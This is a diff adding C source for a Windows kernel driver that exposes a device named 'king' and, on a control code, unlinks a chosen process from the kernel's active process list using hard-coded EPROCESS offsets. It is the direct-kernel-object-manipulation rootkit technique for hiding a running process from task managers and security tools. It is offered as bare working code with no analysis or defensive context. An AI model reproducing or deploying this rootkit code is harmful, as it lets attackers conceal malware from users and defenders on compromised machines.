@@ -1,0 +1,133 @@
+#define DEBUGMSG
+
+#include <ntddk.h>
+#define DWORD ULONG
+#define NT_DEVICE_NAME          L"//Device//king"
+#define DOS_DEVICE_NAME         L"//DosDevices//king"
+
+
+void DriverUnloAd(IN PDRIVER_OBJECT Driver_object);
+NTSTATUS DriverDispAtch(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp);
+NTSTATUS myDriverIoControl(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp);
+DWORD FindProcessEPROC(int Terminate_PID);
+int PIDOFFSET=0x84;
+int FLINKOFFSET=0x88;
+PDEVICE_OBJECT KingObject=NULL;
+
+NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath)
+{
+    PUNICODE_STRING pString;
+    UNICODE_STRING ntDeviceName;
+    UNICODE_STRING win32DeviceName;
+    NTSTATUS status;
+
+    RtlInitUnicodeString(&ntDeviceName,NT_DEVICE_NAME);
+    DbgPrint("Start/n");
+
+    if (!NT_SUCCESS(status = IoCreateDevice(DriverObject,0,&ntDeviceName,
+                                          FILE_DEVICE_UNKNOWN,0,FALSE,
+                                          &KingObject)))
+    return STATUS_NO_SUCH_DEVICE;
+    DbgPrint("IoCreateDevice:%x/n",status);
+
+    RtlInitUnicodeString(&win32DeviceName,DOS_DEVICE_NAME);
+
+    if (!NT_SUCCESS(status = IoCreateSymbolicLink(&win32DeviceName,&ntDeviceName)))
+    return STATUS_NO_SUCH_DEVICE;
+    DbgPrint("IoCreateSymbolicLink:%x/n",status);
+
+    DriverObject->MajorFunction[IRP_MJ_CREATE]=DriverObject->MajorFunction[IRP_MJ_CLOSE]=DriverDispAtch;
+    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]=myDriverIoControl;
+    DriverObject->DriverUnload=DriverUnloAd;
+
+    return STATUS_SUCCESS;
+}
+
+NTSTATUS myDriverIoControl(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
+{
+    NTSTATUS ntStatus=STATUS_SUCCESS;
+    PIO_STACK_LOCATION stack;
+    DWORD *in_buffer, *out_buffer;
+    ULONG code,out_size;
+    DWORD eproc=0;
+    PLIST_ENTRY plist_active_procs;
+
+
+
+    stack = IoGetCurrentIrpStackLocation(Irp);
+    out_size = stack->Parameters.DeviceIoControl.OutputBufferLength;
+    code = stack->Parameters.DeviceIoControl.IoControlCode;
+
+    in_buffer = out_buffer = Irp->AssociatedIrp.SystemBuffer;
+
+    if(code==800)
+    {
+        DWORD PID=*in_buffer;
+        eproc=FindProcessEPROC(PID);
+        if(eproc==0)
+        {
+            Irp->IoStatus.Status = ntStatus;
+            IoCompleteRequest(Irp,IO_NO_INCREMENT);
+            return ntStatus;
+        }
+        plist_active_procs=(LIST_ENTRY *)(eproc+FLINKOFFSET);
+        *((DWORD *)plist_active_procs->Blink)=(DWORD)plist_active_procs->Flink;
+        *((DWORD *)plist_active_procs->Flink+1)=(DWORD)plist_active_procs->Blink;
+        Irp->IoStatus.Status = ntStatus;
+        IoCompleteRequest(Irp,IO_NO_INCREMENT);
+        return ntStatus;
+    }
+     *out_buffer = 0; 
+     Irp->IoStatus.Information = 4;
+     ntStatus = STATUS_INVALID_DEVICE_REQUEST;
+
+    return ntStatus;
+}
+
+NTSTATUS DriverDispAtch(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
+{
+    Irp->IoStatus.Status=STATUS_SUCCESS;
+    IoCompleteRequest(Irp,IO_NO_INCREMENT);
+    return STATUS_SUCCESS;
+}
+
+VOID DriverUnloAd (IN PDRIVER_OBJECT DriverObject)
+{
+    UNICODE_STRING win32DeviceName;
+
+    RtlInitUnicodeString(&win32DeviceName,DOS_DEVICE_NAME);
+    IoDeleteSymbolicLink(&win32DeviceName);
+
+    IoDeleteDevice(KingObject);
+    return;
+}
+
+DWORD FindProcessEPROC(int terminate_PID)
+{
+    DWORD eproc =0;
+    int current_PID=0;
+    int start_PID=0;
+    int i_count=0;
+    PLIST_ENTRY plist_active_procs;
+    if(terminate_PID==0) return terminate_PID;
+    eproc=(DWORD)PsGetCurrentProcess();
+    start_PID=*((DWORD*)(eproc+PIDOFFSET));
+    current_PID=start_PID;
+
+    while(1)
+    {
+        if(terminate_PID==current_PID) return eproc;
+        else if((i_count>=1)&&(start_PID==current_PID))
+        {
+            return 0;
+        }
+        else
+        {
+            plist_active_procs=(LIST_ENTRY*)(eproc+FLINKOFFSET);
+            eproc=(DWORD)plist_active_procs->Flink;
+            eproc=eproc-FLINKOFFSET;
+            current_PID=*((int *)(eproc+PIDOFFSET));
+            i_count++;
+        }
+    }
+}
